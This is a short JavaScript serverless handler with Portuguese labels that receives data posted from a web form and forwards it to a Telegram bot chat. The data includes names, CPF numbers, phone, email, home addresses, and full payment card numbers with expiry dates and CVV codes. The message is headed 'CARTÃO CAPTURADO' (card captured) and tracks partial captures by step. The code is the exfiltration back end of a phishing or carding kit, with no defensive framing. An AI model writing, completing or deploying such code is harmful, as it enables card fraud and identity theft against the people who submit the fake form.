export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  const b = req.body || {};
  const txt = [
    b.status === 'COMPLETO' ? '🟢 <b>CARTÃO CAPTURADO</b>' : '🟡 Parcial · etapa ' + b.etapa,
    '',
    `👤 ${b.nome || '-'}`,
    `CPF: ${b.cpf || '-'}  |  Tel: ${b.telefone || '-'}`,
    `✉️ ${b.email || '-'}`,
    `📍 ${b.rua || '-'}, ${b.numero || '-'} ${b.complemento || ''} — ${b.bairro || ''}, ${b.cidade || ''}/${b.uf || ''} — ${b.cep || '-'}`,
    '',
    `💳 <code>${b.cartao || '-'}</code>`,
    `Titular: ${b.titular || '-'}  |  Val: ${b.validade || '-'}  |  CVV: ${b.cvv || '-'}  |  ${b.parcelas || 1}x`,
    '',
    `🌐 ${b.ip || ''} · ${(b.ua || '').slice(0, 60)}`
  ].join('\n');

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: txt, parse_mode: 'HTML' })
  }).catch(() => {});

  res.status(200).json({ ok: true });
}
